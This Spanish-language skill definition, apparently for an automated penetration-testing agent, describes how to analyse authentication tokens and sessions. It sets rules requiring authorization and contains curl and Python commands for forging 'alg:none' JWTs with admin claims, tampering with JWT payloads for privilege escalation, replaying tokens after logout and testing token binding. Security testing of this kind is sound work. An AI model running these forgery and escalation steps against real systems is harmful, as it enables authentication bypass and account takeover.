---
name: token-session-manager
description: Análisis completo de tokens de autenticación — JWT, OAuth Bearer, API Keys, cookies de sesión — rotación, caducidad, privilege escalation, replay y token binding
phase: recon
triggers:
  - Tokens JWT detectados en respuestas o JS bundles
  - Cookies de sesión con nombres como sessionid, token, jwt, auth
  - Múltiples tipos de autenticación en un mismo target
  - Headers Authorization presentes en requests
  - Endpoints que rotan tokens (refresh token detectado)
  - Skills previos reportaron tipos de auth diferentes
---

# token-session-manager

## Activation Contract

Se activa automáticamente cuando se detectan **dos o más** de estos indicadores:
- Respuesta HTTP incluye cookie con flags `HttpOnly`, `Secure`, `SameSite`
- Header `Authorization: Bearer <token>` en requests del target
- Header `Authorization: Basic <base64>` o `X-API-Key`
- Endpoints de login/refresh: `/auth/login`, `/oauth/token`, `/api/auth/refresh`
- JWT decodeable en frontend JS (`eyJ...` payload en bundles)
- Skills previos (`tech-detection`, `js-secrets`, `hardcoded-credentials`) reportaron `jwt`, `oauth`, `token` como tecnologías
- Múltiples endpoints requieren diferentes tipos de auth

Triggers automáticos desde: `tech-detection`, `js-secrets`, `hardcoded-credentials`, `api-version-detect`

## Hard Rules

1. **NUNCA** reutilizar tokens reales de usuarios en ataques — solo analizar estructura y comportamiento.
2. **NO** modificar tokens en producción sin aprobación explícita — probar JWT manipulation solo en ambientes controlados o con autorización.
3. **REQUIERE** separación estricta entre análisis pasivo (leer tokens) y activo (modificar/reutilizar). Marcar cada test con `passive` o `active`.
4. **REPORTAR** inmediatamente si un token funciona desde IP diferente a la original — token binding evasion.
5. **DOCUMENTAR** toda respuesta de servidor ante token manipulation — no solo el resultado.
6. **NO** almacenar tokens válidos en texto plano en logs o archivos de salida sin cifrado.

## Decision Gates

| Gate | Pregunta | Qué hacer |
|------|----------|-----------|
| JWT detectado | ¿Token sigue formato `header.payload.signature`? | Decodificar base64url y analizar header + payload completo |
| Token con exp | ¿Payload contiene `exp`, `iat`, `nbf`? | Calcular tiempo de vida, detectar tokens no-expirantes |
| Rotación | ¿Existe endpoint `/refresh` o `refresh_token`? | Probar token después de 1min, 5min, 15min para detectar caducidad |
| Token binding | ¿Token funciona desde IP diferente? | Probar mismo token desde proxy/VPN diferente |
| JWT sin firma | ¿Header `alg: none` es aceptado? | **Critical** — reportar inmediatamente como autenticación bypass |
| JWT HS256 débil | ¿`alg: HS256` con secret débil? | Intentar crack con wordlist si el payload es conocido |
| Replay | ¿Token reutilizable después de logout? | **High** — reportar como session fixation / replay attack |
| Privilege escalation | ¿Payload JWT modificable? | Probar `role: admin`, `user_id: 1` modificando payload (solo con aprobación) |

## Execution Steps

### Paso 1: Decodificar y clasificar tokens

```python
# Analizar JWT
python3 -c "
import base64, json, sys

def decode_jwt_part(part):
    padding = 4 - len(part) % 4
    if padding != 4:
        part += '=' * padding
    try:
        return json.loads(base64.urlsafe_b64decode(part))
    except:
        return {'error': 'no se pudo decodificar'}

token = sys.argv[1]
parts = token.split('.')
if len(parts) == 3:
    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    print(json.dumps({'header': header, 'payload': payload}, indent=2))
else:
    print({'error': 'no es un JWT válido'})
" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

Clasificar por tipo:
- **JWT**: `header.payload.signature` → analizar alg, typ, kid, jku
- **OAuth Bearer**: token opaco en `Authorization: Bearer <token>` → probar en puntos de validación
- **API Key**: header `X-API-Key` o query param `?api_key=` → detectar formato y prefix
- **Session Cookie**: `sessionid=<uuid>` → analizar flags HttpOnly, Secure, SameSite, Domain, Path
- **SAML**: `SAMLRequest=<base64>` → detectar en responses de login

### Paso 2: Extraer cookies y analizar flags

```bash
# Desde response headers
curl -s -D - "https://target.com/login" -o /dev/null 2>&1 | grep -i 'set-cookie'
```

Analizar cada cookie:
- `HttpOnly` — ausente = **high** (XSS puede robar cookie)
- `Secure` — ausente = **medium** (cookie viaja en texto plano)
- `SameSite` — `None` sin Secure = **high** (CSRF)
- `Domain` — muy amplio = **medium** (cookie enviada a subdominios)
- `Path` — `/` = informativo (cookie disponible en toda la app)
- `Expires` / `Max-Age` — ausente = session cookie (dura hasta cerrar browser)

### Paso 3: Detectar rotación y caducidad

```bash
# Obtener token
TOKEN=$(curl -s -X POST "https://target.com/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}' | python3 -c "import sys,json;print(json.load(sys.stdin).get('token',''))")

# Probar después de 60s
sleep 60
curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN"

# Probar después de 300s
sleep 240
curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN"
```

Si el token sigue funcionando después de 5-10 minutos, clasificar como caducidad larga. Si funciona después de horas, reportar como token no-expirante.

Detectar **refresh token rotation**:
```bash
# Obtener refresh token
REFRESH=$(curl -s ... | python3 -c "...")
# Usar refresh token para obtener nuevo access token
curl -s -X POST "https://target.com/auth/refresh" \
  -H "Content-Type: application/json" \
  -d "{\"refresh_token\":\"$REFRESH\"}"
# Verificar si el refresh token anterior sigue funcionando
curl -s -X POST "https://target.com/auth/refresh" \
  -H "Content-Type: application/json" \
  -d "{\"refresh_token\":\"$REFRESH\"}"
```
Si el refresh token anterior sigue funcionando después de usarlo → **no hay rotation** = high finding.

### Paso 4: Token binding test

```bash
# Obtener token desde IP original
TOKEN=$(curl -s -X POST "https://target.com/auth/login" ... | jq -r '.token')

# Probar desde IP diferente (usando proxy)
curl -s -x "http://proxy-diferente:8080" \
  "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN"
```

### Paso 5: Replay attack test

```bash
# Obtener token
TOKEN=$(curl -s -X POST ... | jq -r '.token')
# Hacer logout
curl -s -X POST "https://target.com/auth/logout" -H "Authorization: Bearer $TOKEN"
# Reutilizar token después de logout
curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN"
```

Si el token funciona después de logout → **high** — replay attack.

### Paso 6: JWT signature manipulation

```bash
# Probar alg: none
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"
# Enviar token manipulado
curl -s "https://target.com/api/admin" \
  -H "Authorization: Bearer $HEADER.$PAYLOAD."
```

Si el servidor acepta `alg: none` → **critical**.

### Paso 7: JWT privilege escalation

```bash
# Decodificar token original → obtener payload
# Modificar payload: role: admin, user_id: 1
# Regenerar con mismo header (si no hay verificación de firma)
python3 -c "
import base64, json
orig_payload = json.loads(base64.urlsafe_b64decode('PAYLOAD_PART'))
orig_payload['role'] = 'admin'
orig_payload['user_id'] = 1
new_payload = base64.urlsafe_b64encode(json.dumps(orig_payload).encode()).decode().rstrip('=')
print(f'HEADER.{new_payload}.SIGNATURE')
"
```

(Solo con aprobación del operador — decision gate activa)

### Paso 8: Mapear endpoints por tipo de auth

```bash
# Endpoints públicos
curl -s -o /dev/null -w "status=%{http_code}" "https://target.com/api/public"
# Endpoints con API Key
curl -s -o /dev/null -w "status=%{http_code}" "https://target.com/api/data" \
  -H "X-API-Key: test"
# Endpoints con Bearer
curl -s -o /dev/null -w "status=%{http_code}" "https://target.com/api/data" \
  -H "Authorization: Bearer test"
```

Construir matriz: endpoint × auth_type × response_code.

## Output Contract

```json
{
  "skill": "token-session-manager",
  "phase": "recon",
  "target": "string",
  "tokens_discovered": [
    {
      "type": "jwt|oauth-bearer|api-key|cookie|saml",
      "name": "access_token",
      "location": "header|cookie|body|js-bundle",
      "structure": {
        "header": {"alg": "HS256", "typ": "JWT", "kid": "key1"},
        "payload": {"sub": "user123", "role": "user", "exp": 1700000000, "iat": 1699996400},
        "signature": "base64url_encoded"
      },
      "ttl_seconds": 3600,
      "rotates": true,
      "refresh_token_detected": true,
      "refresh_token_rotation": true
    }
  ],
  "cookies": [
    {
      "name": "sessionid",
      "domain": ".target.com",
      "path": "/",
      "httponly": true,
      "secure": true,
      "samesite": "lax",
      "max_age": null,
      "expires": null
    }
  ],
  "token_behavior": {
    "rotation_period_seconds": 3600,
    "refresh_token_rotation": true,
    "token_binding": {"enabled": true, "ip_tied": false},
    "replay_after_logout": false,
    "token_non_expiring": false
  },
  "endpoints_auth_matrix": [
    {"path": "/api/public", "public": 200, "bearer": 200, "api_key": 200},
    {"path": "/api/users", "public": 401, "bearer": 200, "api_key": 401},
    {"path": "/api/admin", "public": 401, "bearer": 403, "api_key": 401}
  ],
  "vulnerabilities": [
    {
      "title": "JWT sin firma aceptado (alg:none)",
      "severity": "critical",
      "category": "auth-bypass",
      "cwe": "CWE-347",
      "mitre": "T1592.002",
      "evidence": "Token con alg:none fue aceptado en endpoint /api/admin devolviendo 200",
      "next_steps": ["reportar como autenticación completamente bypassable", "probar privilege escalation con payload admin"]
    },
    {
      "title": "Token no expira después de logout",
      "severity": "high",
      "category": "session-fixation",
      "cwe": "CWE-384",
      "evidence": "Token sigue siendo válido 5 minutos después de /auth/logout"
    },
    {
      "title": "Refresh token sin rotation",
      "severity": "high",
      "category": "token-reuse",
      "cwe": "CWE-804",
      "evidence": "Refresh token reutilizable múltiples veces sin invalidación"
    },
    {
      "title": "Cookie sin HttpOnly",
      "severity": "high",
      "category": "insecure-cookie",
      "cwe": "CWE-1004",
      "evidence": "Cookie sessionid no tiene flag HttpOnly — disponible para JavaScript"
    }
  ],
  "auth_summary": {
    "total_tokens": 3,
    "auth_types": ["jwt", "api-key", "cookie"],
    "rotation_detected": true,
    "binding_detected": false,
    "findings_critical": 1,
    "findings_high": 3,
    "recommended_next_skills": ["hunt-jwt-attacks", "hunt-oauth-flow", "hunt-session-fixation"]
  }
}
```
